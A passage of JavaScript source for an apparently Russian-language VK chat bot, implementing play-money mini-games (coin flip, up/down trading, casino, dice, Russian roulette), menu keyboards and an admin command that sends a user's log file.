setTimeout(() => context.send(`${nick}, выпал орёл, вы проиграли ${utils.sp(res)}$ 😣
💰 Баланс: ${utils.sp(user.balance)}$`), time) 
}
if(win == 2){
	let a = Math.floor(res *= Number(0.5))
	user.balance -= Number(a)
	setTimeout(() => context.send(`${nick}, монетка потерялась, вы проиграли часть ставки.
	💰 Баланс: ${utils.sp(user.balance)}$`), time)
}
if(win == 3) {
user.balance += Number(res)
setTimeout(() => context.send(`${nick}, выпала решка, вы выиграли ${utils.sp(res)}$ 
💰 Баланс: ${utils.sp(user.balance)}$`), time) 
}
})

updates.hear(/монетка орел (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
res = res.replace(".", "");
res = res.replace("кккк", "000000000000");
res = res.replace("ккк", "000000000");
res = res.replace("кк", "000000");
res = res.replace("к", "000");
if(!Number(res)) return context.send(`Упс... Я не знаю такой команды 🙁`)
res = Number(res)
if(res < Number(250)) return context.send(`${nick}, минимальная ставка 250$ 😔`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас не хватает денег 😞
💰 Баланс: ${utils.sp(user.balance)}$`)
let win = getRandomInRange(1, 3)
context.send(`${nick}, ставка ${utils.sp(res)}$ на орла сделана 
⏳ Ожидайте... `)
let time = getRandomInRange(1, 5)
time *= Number(1000)
if(win == 1) {
user.balance -= Number(res)
setTimeout(() => context.send(`${nick}, выпала решка, вы проиграли ${utils.sp(res)}$ 😣
💰 Баланс: ${utils.sp(user.balance)}$`), time) 
}
if(win == 2){
	let a = Math.floor(res *= Number(0.5))
	user.balance -= Number(a)
	setTimeout(() => context.send(`${nick}, монетка потерялась, вы проиграли часть ставки.
	💰 Баланс: ${utils.sp(user.balance)}$`), time)
}
if(win == 3) {
user.balance += Number(res)
setTimeout(() => context.send(`${nick}, выпал орёл, вы выиграли ${utils.sp(res)}$ 
💰 Баланс: ${utils.sp(user.balance)}$`), time) 
}
})

updates.hear(/монетка орёл (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
res = res.replace(".", "");
res = res.replace("кккк", "000000000000");
res = res.replace("ккк", "000000000");
res = res.replace("кк", "000000");
res = res.replace("к", "000");
if(!Number(res)) return context.send(`Упс... Я не знаю такой команды 🙁`)
res = Number(res)
if(res < Number(250)) return context.send(`${nick}, минимальная ставка 250$ 😔`)
if(user.balance < Number(res)) return context.send(`${nick}, у вас не хватает денег 😞
💰 Баланс: ${utils.sp(user.balance)}$`)
let win = getRandomInRange(1, 3)
context.send(`${nick}, ставка ${utils.sp(res)}$ на орла сделана 
⏳ Ожидайте... `)
let time = getRandomInRange(1, 5)
time *= Number(1000)
if(win == 1) {
user.balance -= Number(res)
setTimeout(() => context.send(`${nick}, выпала решка, вы проиграли ${utils.sp(res)}$ 😣
💰 Баланс: ${utils.sp(user.balance)}$`), time) 
}
if(win == 2){
	let a = Math.floor(res *= Number(0.5))
	user.balance -= Number(a)
	setTimeout(() => context.send(`${nick}, монетка потерялась, вы проиграли часть ставки.
	💰 Баланс: ${utils.sp(user.balance)}$`), time)
}
if(win == 3) {
user.balance += Number(res)
setTimeout(() => context.send(`${nick}, выпал орёл, вы выиграли ${utils.sp(res)}$ 
💰 Баланс: ${utils.sp(user.balance)}$`), time) 
}
})

updates.hear(/Стаканчик$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, Используй: <<Стаканчик [1-3] [сумма]>>`)

})

updates.hear(/трейд вверх (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
 if(!Number(res)) return context.send(`${nick}, введите направление курса и сумму ставки: «[вверх/вниз] [сумма]» или «[1/2]» [сумма]`)
 if(Number(res) < 1) return context.send(`${nick}, введите направление курса и сумму ставки: «[вверх/вниз] [сумма]» или «[1/2]» [сумма]`)
res = Number(res)
if(user.balance < res) return context.send(`${nick}, недостаточно денег 😣`)
if(res < 50) return context.send(`${nick}, сумма трейда должна быть не менее 50$ 😣`)
let kyrc = getRandomInRange(1, 1000)
let win = getRandomInRange(1, 2)
let losesmile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
let winsmile = utils.pick([`😎`, `😀`, ` 🤑`,`😇`]) 
if(win == 1) {
let prize = Number(res)
user.balance += Number(prize)
return context.send(`${nick}, курс подорожал⤴ на ${utils.sp(kyrc)}$
✅ Вы заработали +${utils.sp(prize)}$ ${winsmile}
💰 Баланс: ${utils.sp(user.balance)}$`)


}

if(win == 2) {
user.balance -= Number(res)
return context.send(`${nick}, курс подешевел⤵ на ${utils.sp(kyrc)}$
❌ Вы потеряли ${utils.sp(res)}$ ${losesmile}
💰 Баланс: ${utils.sp(user.balance)}$`)


}


})

updates.hear(/трейд вниз (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
 let str = context.$match[1] 
 let re = str.replace(".", ""); 
 let rel = str.replace(/все|всё|всо/ig, user.balance)
 let rem = rel.replace("кккк", "000000000000"); 
 let ren = rem.replace("ккк", "000000000"); 
 let req = ren.replace("кк", "000000"); 
 let res = req.replace("к", "000"); 
 if(!Number(res)) return context.send(`${nick}, введите направление курса и сумму ставки: «[вверх/вниз] [сумма]» или «[1/2]» [сумма]`)
 if(Number(res) < 1) return context.send(`${nick}, введите направление курса и сумму ставки: «[вверх/вниз] [сумма]» или «[1/2]» [сумма]`)
res = Number(res)
if(user.balance < res) return context.send(`${nick}, недостаточно денег 😣`)
if(res < 50) return context.send(`${nick}, сумма трейда должна быть не менее 50$ 😣`)
let kyrc = getRandomInRange(1, 1000)
let win = getRandomInRange(1, 2)
let losesmile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
let winsmile = utils.pick([`😎`, `😀`, ` 🤑`,`😇`]) 
if(win == 2) {
let prize = Number(res)
user.balance += Number(prize)
return context.send(`${nick}, курс подешевел⤵ на ${utils.sp(kyrc)}$
✅ Вы заработали +${utils.sp(prize)}$ ${winsmile}
💰 Баланс: ${utils.sp(user.balance)}$`)


}

if(win == 1) {
user.balance -= Number(res)
return context.send(`${nick}, курс подорожал⤴ на ${utils.sp(kyrc)}$
❌ Вы потеряли ${utils.sp(res)}$ ${losesmile}
💰 Баланс: ${utils.sp(user.balance)}$`)


}


})

updates.hear(/трейд$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, Используй: <<Трейд [вверх/вниз] [сумма]>>`)

})

updates.hear(/Казино|Азино$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let one = user.balance
let two = user.balance
let three = user.balance
let four = user.balance
let five = user.balance
let six = user.balance
one /= Number(4)
two /= Number(2)
three = Number(three)
four /= Number(12)
five /= Number(3)
six /= Number(1.5)
return context.send({message: `${nick}, для игры в казино используйте команду «Казино [сумма]»`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(one))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(two))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(three))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(four))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(five))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(six))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
})
updates.hear(/🎰 (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan] 
 
 
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`,`)){
		res = res.replace(`,`,``)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`$`)){
		res = res.replace(`$`,``)
	}
	while(res.includes(`🎰`)){
		res = res.replace(`🎰`,``)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
	}
	while(res.includes(`всё`)){
		res = res.replace(`всё`,`${user.balance}`)
	}
	while(res.includes(`все`)){
		res = res.replace(`все`,`${user.balance}`)
	}
	while(res.includes(`вабанк`)){
		res = res.replace(`вабанк`,`${user.balance}`)
	}
 if(!Number(res)) return context.send(`${nick}, ставка должна быть минимум 1$ 😲`) 
 if(user.balance < Number(res)) return context.send(`${nick}, у вас недостаточно денег 😒
💰 Баланс: ${utils.sp(user.balance)}$`)
 if(res < 1) return context.send(`${nick}, ставка должна быть минимум 1$ 😲`)
 
 let numb = 0
 let random = getRandomInRange(0, 100)
let addtext = ``
 if(random > 0) numb = 0
 if(random > 5) numb = 0.5
 if(random > 80) numb = 2
 if(random > 97) numb = 10
if(user.potioneffect == 1 && user.potioneffecttime > 0 && user.rank < 2) {
if(numb == 0) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0
 if(random > 25) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0) addtext = `🍹 Вам бы выпало x0, если бы не зелье`
	}
if(numb == 0.5) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0.5) addtext = `🍹 Вам бы выпало x0.5, если бы не зелье`
	}
	}
if(user.rank > 1) {
let status = ``
if(user.rank == 2) status = `🔥 V.i.P` 
if(user.rank == 3) status = `🔮 Premium` 
if(user.rank == 4) status = `🌀 Модератор` 
if(user.rank > 4) status = `👑 Администратор`
if(numb == 0) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0
 if(random > 25) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0) addtext = `✨ Вам бы выпало x0, если бы не ${status}`
	}
if(numb == 0.5) {
random = getRandomInRange(1, 100)
 if(random > 0) numb = 0.5
 if(random > 90) numb = 2
 if(numb !== 0.5) addtext = `✨ Вам бы выпало x0.5, если бы не ${status}`
	}
	}

 let noule = res
 let count = Math.trunc(res * numb)
 let doouble = count / 70
 doouble = Math.trunc(doouble)
 
  if(numb == 0) count = user.balance

 let result = 0 
 if(numb == 0) result = "вы проиграли"
 if(numb == 0.5) result = "вы проиграли"
  if(numb == 0.75) result = "вы проиграли"
 if(numb == 1) result = "деньги остаются при Вас!"
 if(numb == 2) result = "вы выиграли"
 if(numb == 3) result = "вы выиграли"
 if(numb == 10) result = "вы выиграли"
 
 let smile = 0 
  if(numb == 0) smile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
 if(numb == 0.5) smile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
  if(numb == 0.75) smile = utils.pick([`😲`, `😣`, ` 😮`,`😔`]) 
 if(numb == 1) smile = utils.pick([`😀`, `😚`, ` ☺️`,`😏`]) 
 if(numb == 2) smile = utils.pick([`😎`, `😀`, ` 🤑`,`😇`]) 
 if(numb == 10) smile = utils.pick([`😎`, `😀`, ` 🤑`,`😇`]) 
 if(numb == 3) smile = utils.pick([`👑`, `😀`, ` 🤑`,`😇`]) 
 if(numb == 0) count = noule
 
 user.balance -= Number(res)  
 user.balance += Math.trunc(res * numb) 
 
let one = user.balance
let two = user.balance
let three = user.balance
let four = user.balance
let five = user.balance
let six = user.balance
one /= Number(4)
two /= Number(2)
three = Number(three)
four /= Number(12)
five /= Number(3)
six /= Number(1.5)
if(user.keyb === 0){
	return context.send({message: `${nick}, ${(result)} ${utils.sp(count)}$ (x${numb}) ${(smile)} \n💰Баланс: ${utils.sp(user.balance)}$\n${addtext}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(one))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(two))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(three))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(four))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(five))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: `🎰 ${utils.sp(Math.trunc(six))}$`, 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
}
return context.send(`${nick}, ${(result)} ${utils.sp(count)}$ (x${numb}) ${(smile)} \n💰Баланс: ${utils.sp(user.balance)}$\n${addtext}`)
 })

updates.hear(/монетка$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, Используй: <<Монетка [орёл/решка] [сумма]>>`)

})

updates.hear(/🎲 ([1-6])$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let cyb = Number(context.$match[1])
let rand = getRandomInRange(1, 6)
if(cyb == rand) {
let win = getRandomInRange(1, 50)
win *= Number(1000)
user.balance += Number(win)
return context.send({message: `${nick}, вы угадали! Приз ${utils.sp(win)}$`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🎲 1', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 2', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 3', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🎲 4', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 5', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 6', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
}
return context.send({message: `${nick}, не угадали 😟
🎲 Выпало число ${rand}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🎲 1', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 2', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 3', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🎲 4', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 5', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 6', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
})


updates.hear(/кубик ([1-6])$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let cyb = Number(context.$match[1])
let rand = getRandomInRange(1, 6)
if(cyb == rand) {
let win = getRandomInRange(1, 50)
win *= Number(1000)
user.balance += Number(win)
return context.send({message: `${nick}, вы угадали! Приз ${utils.sp(win)}$`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🎲 1', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 2', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 3', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🎲 4', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 5', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 6', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
}
return context.send({message: `${nick}, не угадали 😟
🎲 Выпало число ${rand}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🎲 1', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 2', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 3', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🎲 4', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 5', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 6', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
})

updates.hear(/кубик$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send({message: `${nick}, для игры в кубик вводите числа от 1 до 6`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🎲 1', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 2', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 3', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🎲 4', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 5', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 6', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ Игры', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
})

updates.hear(/игры$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send({message: `${nick}, мои игры:
🔫 Рулетка - русская рулетка
🎲 Кубик [1-6]
🎰 Казино [сумма]
📈 Трейд [вверх/вниз] [сумма]
🥛 Стаканчик [1-3] [сумма]
🦅 Монетка [орёл/решка] [сумма]`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔫 Рулетка', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎲 Кубик', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🎰 Казино', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '📈 Трейд', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🥛 Стаканчик', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🦅 Монетка', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
      		Keyboard.textButton({ 
      		label: '◀ В главное меню', 
      		color: Keyboard.PRIMARY_COLOR,
     		})
      ]
     ])
     .inline(platform)
 })
})
updates.hear(/выстрел$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.shots == 0) {
let shots = getRandomInRange(1, 6)
user.shots = Number(shots)
user.shotprize = Number(2500)
user.shotscount = 0
return context.send({message: `${nick}, вы начали игру в «Русскую рулетку» 👍
🔫 Для продолжения введите «Выстрел»
❓ Для остановки введите команду «Рулетка» повторно!`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔫 Выстрелить', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💵 Остановиться', 
            color: Keyboard.PRIMARY_COLOR,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '◀ Игры', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
}
let b = ``
let rip = 0
user.shotscount += Number(1)
if(user.balance > 8000) {
	rip = getRandomInRange(1, 8)
	rip *= Number(1000)
	b = `❤ На лечение потрачено: ${utils.sp(rip)}`
}
if(user.shots == 1) {
user.balance -= Number(rip)
user.shots = 0
user.shotprize = 0
return context.send({message: `${nick}, вы выстрелили на ${user.shotscount}-й попытке ☹
${b}`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔫 Заново', 
            color: Keyboard.POSITIVE_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀ Игры', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
}
user.shots -= Number(1)
user.shotprize *= Number(2)
return context.send({message: `${nick}, вы сделали ${user.shotscount}-й выстрел 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔫 Выстрелить', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💵 Остановиться', 
            color: Keyboard.PRIMARY_COLOR,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '◀ Игры', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
})

updates.hear(/остановиться|рулетка|заново$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.shots == 0) {
let shots = getRandomInRange(1, 6)
user.shots = Number(shots)
user.shotprize = Number(2500)
user.shotscount = 0
return context.send({message: `${nick}, вы начали игру в «Русскую рулетку» 👍
🔫 Для продолжения введите «Выстрел»
❓ Для остановки введите команду «Рулетка» повторно!`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔫 Выстрелить', 
            color: Keyboard.POSITIVE_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💵 Остановиться', 
            color: Keyboard.PRIMARY_COLOR,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '◀ Игры', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
}
if(user.shotprize == 2500) user.shotprize = 0
user.balance += Number(user.shotprize)
user.shots = 0
return context.send({message: `${nick}, вы остановились на ${user.shotscount}-м выстреле! 👍
💸 Приз: ${utils.sp(user.shotprize)}$`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔫 Заново', 
            color: Keyboard.POSITIVE_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀ Игры', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
})


updates.hear(/chatid$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(context.chatId)
	})
updates.hear(/log ([0-9]+)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(user.rank < 4) return
	if(context.isChat) return context.send(`${nick}, данная команда доступна только в лс! ✉️`)
	if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
	let file = `${context.$match[1]}_log.txt`
  async function run() {
  await fs.writeFileSync(`${context.$match[1]}_log.txt`, `${logs[context.$match[1]].text}`);
  await context.sendDocument({
                        value: `${context.$match[1]}_log.txt`,
                        filename: `${file}`,
                    }, {
                        message: `${nick}, логи *id${base.bs[context.$match[1]].id}:`
                    }) 
  await fs.unlinkSync(`${context.$match[1]}_log.txt`);
}
run();
	
	})
	
updates.hear(/проф|профиль$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let task = `` 
if(user.carid > 0) {
